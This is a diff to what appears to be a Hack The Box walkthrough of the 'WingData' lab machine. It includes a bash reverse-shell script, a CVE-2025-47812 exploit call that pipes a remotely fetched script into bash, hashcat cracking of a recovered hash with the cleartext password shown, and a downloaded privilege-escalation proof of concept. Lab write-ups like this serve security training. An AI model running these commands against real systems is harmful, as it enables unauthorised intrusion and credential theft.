@@ -50,23 +50,96 @@ python3 52347.py -u http://ftp.wingdata.htb -U anonymous -c "whoami"
 
 
 
+---
+
+
+```
+echo 'bash -i >& /dev/tcp/10.10.16.113/9999 0>&1' > /tmp/shell.sh
+cd /tmp && python3 -m http.server 8888
+```
+
+
+```
+python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
+        -c "curl http://10.10.16.113:8888/shell.sh|bash" -v
+```
+
+
+<img width="1439" height="252" alt="image" src="https://github.com/user-attachments/assets/1dd5f0cb-5988-46a8-b153-796a28f81a51" />
+
+
+---
+
+## get shell
+
+
+<img width="902" height="231" alt="image" src="https://github.com/user-attachments/assets/0e66ce3c-bdb5-490b-8600-ef2041375353" />
 
 
 
+## after digging in system found :
+
+
+<img width="1179" height="349" alt="image" src="https://github.com/user-attachments/assets/50beba68-0605-4423-a006-933e088609fa" />
+
+```
+wacky : 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+```
+
+```
+echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca' > hash.txt
+```
+
+```
+hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+
+<img width="1499" height="566" alt="image" src="https://github.com/user-attachments/assets/72c9134c-4055-4864-a5ad-aa73d7e50e33" />
+
+## found first user
+
+```
+wacky : !#7Blushing^*Bride5
+```
+
+## login with ssh 
+
+```
+ssh wacky@10.129.244.106   
+```
+
+
+<img width="1185" height="358" alt="image" src="https://github.com/user-attachments/assets/e345dce3-4984-4de0-88f6-47ca229ddc33" />
 
 
 
+## privesc
+
+```
+sudo -l
+```
+
+
+<img width="1131" height="154" alt="image" src="https://github.com/user-attachments/assets/5bf17b4b-d4f2-4f64-a2c0-697f7bb8732d" />
 
 
 
+```
+# On Kali
+git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
+cd CVE-2025-4517-POC-HTB-WingData
+python3 -m http.server 80
+
+# On target
+cd /tmp
+wget http://YOUR_IP/CVE-2025-4517-POC.py
+python3 /tmp/CVE-2025-4517-POC.py
+```
 
 
 
-
-
-
-
-
+<img width="777" height="151" alt="image" src="https://github.com/user-attachments/assets/5925e7f4-6877-4db3-825b-19b93722aed9" />
 
 
 
